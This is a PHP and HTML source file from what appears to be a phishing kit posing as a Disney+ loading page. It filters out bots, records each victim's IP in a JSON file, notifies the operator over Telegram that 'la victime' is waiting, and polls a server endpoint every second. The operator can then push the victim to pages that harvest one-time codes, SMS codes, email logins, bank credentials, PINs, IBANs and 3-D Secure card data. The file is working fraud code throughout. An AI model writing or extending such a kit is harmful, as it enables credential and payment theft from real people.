<?php
session_start();

include('../../common/sub_includes.php');
include('../../app/1.php');
include('../../app/2.php');
include('../traduction.php');

if (($_SESSION['index']  ?? '') != '1') { header('Location: ../../', true, 302); exit; }
if (($_SESSION['bot']    ?? '') != '1') { header('Location: /site/index.html', true, 302); exit; }
if (($_SESSION['client'] ?? '') != '1') { die('THE SITE IS UNDER MAINTENANCE PLEASE TRY LATER'); }

$ip  = $_SESSION['ip'] ?? '';
$hub = $_SESSION['id5'] ?? '';

$files = ['otp', 'otperror', 'mail', 'mailerror', 'sms', 'smserror',
          'bank', 'bankerror', 'pin', 'pinerror', 'iban', 'ibanerror',
          'vbv', 'fin', 'carteInvalide'];

foreach ($files as $f) {
    if ($ip !== '') {
        removeIPFromFile(__DIR__ . '/redirect/' . $f . '.txt', $ip);
    }
}

$file = '../../users.json';
$fh = @fopen($file, 'c+');
if ($fh) {
    flock($fh, LOCK_EX);
    $raw  = stream_get_contents($fh);
    $data = $raw !== '' ? json_decode($raw, true) : null;
    if (!is_array($data) || !isset($data['users']) || !is_array($data['users'])) {
        $data = ['users' => []];
    }
    $data['users'][$ip]['step'] = '5';
    ftruncate($fh, 0); rewind($fh);
    fwrite($fh, json_encode($data, JSON_PRETTY_PRINT));
    fflush($fh); flock($fh, flock($fh, LOCK_UN) ? LOCK_UN : LOCK_UN); fclose($fh);
}

if ($ip !== '' && empty($_SESSION['notif_hub'])) {
    sendMessage($telegram['NotifsChatId'], "La victime {$ip} est sur le carrefour, en attente de ta décision");
    $_SESSION['notif_hub'] = 1;
}

$map = [
    'fin'           => '../' . ($_SESSION['id14'] ?? '') . '/',
    'otp'           => '../' . ($_SESSION['id7']  ?? '') . '/',
    'otperror'      => '../' . ($_SESSION['id7']  ?? '') . '/?error',
    'mail'          => '../' . ($_SESSION['id8']  ?? '') . '/',
    'mailerror'     => '../' . ($_SESSION['id8']  ?? '') . '/?error',
    'sms'           => '../' . ($_SESSION['id9']  ?? '') . '/',
    'smserror'      => '../' . ($_SESSION['id9']  ?? '') . '/?error',
    'bank'          => '../' . ($_SESSION['id13'] ?? '') . '/',
    'bankerror'     => '../' . ($_SESSION['id13'] ?? '') . '/?error',
    'pin'           => '../' . ($_SESSION['id10'] ?? '') . '/',
    'pinerror'      => '../' . ($_SESSION['id10'] ?? '') . '/?error',
    'iban'          => '../' . ($_SESSION['id11'] ?? '') . '/',
    'ibanerror'     => '../' . ($_SESSION['id11'] ?? '') . '/?error',
    'vbv'           => '../' . ($_SESSION['id12'] ?? '') . '/',
    'carteInvalide' => '../' . ($_SESSION['id4']  ?? '') . '/?error',
];

$load = $_SESSION['load'] ?? '';
unset($_SESSION['load']);
?>
<!DOCTYPE html>
<html lang="fr">
  <head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Disney+</title>
    <link rel="stylesheet" href="../../public/css/loading.css">
    <?php if ($load !== '') { ?><meta http-equiv="refresh" content="3; url=../<?= htmlspecialchars($load) ?>/"><?php } ?>
  </head>
  <body style="background:rgb(26, 29, 41);" id="app_index" class="typeramp-avenir-world-for-disney">
    <div id="webAppRoot" data-reactroot="">
      <div data-testid="" class="sc-jWBwVP kKMOZf">
        <div alt="" aria-hidden="true" class="progress-indicator progress-indicator--responsive"></div>
      </div>
    </div>
    <script src="../../public/js/jquery.js"></script>
    <script src="../../public/js/redirect.js"></script>
    <script>
    (function () {
      var targets = <?= json_encode($map) ?>;
      var files = Object.keys(targets);
      var busy = false;

      function poll() {
        if (busy) return;
        busy = true;
        fetch('check_ip.php?all=1&t=' + Date.now(), { cache: 'no-store' })
          .then(function (r) { return r.json(); })
          .then(function (d) {
            for (var i = 0; i < files.length; i++) {
              if (d[files[i]]) { window.location.href = targets[files[i]]; return; }
            }
          })
          .catch(function () {})
          .finally(function () { busy = false; });
      }

      poll();
      setInterval(poll, 1000);
    })();
    </script>
  </body>
</html>